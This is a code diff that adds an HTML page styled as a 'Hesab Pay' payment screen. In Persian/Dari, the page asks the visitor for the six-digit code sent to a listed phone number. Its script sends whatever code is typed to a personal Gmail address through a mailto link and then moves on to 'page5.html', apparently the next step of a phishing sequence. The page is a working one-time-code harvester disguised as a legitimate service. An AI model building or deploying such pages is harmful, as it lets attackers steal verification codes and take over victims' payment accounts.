@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hesab Pay</title>
+    <link rel="stylesheet" href="hesabPay.css">
+</head>
+<body>
+
+    <p>لطفا کد شش رقمی که به شماره<br>+۹۳ ۷۶۴ ۱۹۲ ۳۳۵ ارسال گردیده وارد نمایید</p>
+    <input type="number" id="code" placeholder="کد را وارد کنید">
+    <br><br>
+    <button onclick="conTinue()" id="password">ادامه</button>
+    
+    <script>
+
+        function conTinue(){
+            window.location.href='mailto:alfannanmaher@gmail.com?subject=پیام جدید&body=' +
+            encodeURIComponent(document.getElementById('code').value);
+            let req= document.getElementById('code').value;
+
+            if(req.trim()===''){
+                alert('لطفا کد را وارد کنید');
+            }else{
+                window.location.href='page5.html'
+            }
+        }
+
+    </script>
+
+</body>
+</html>
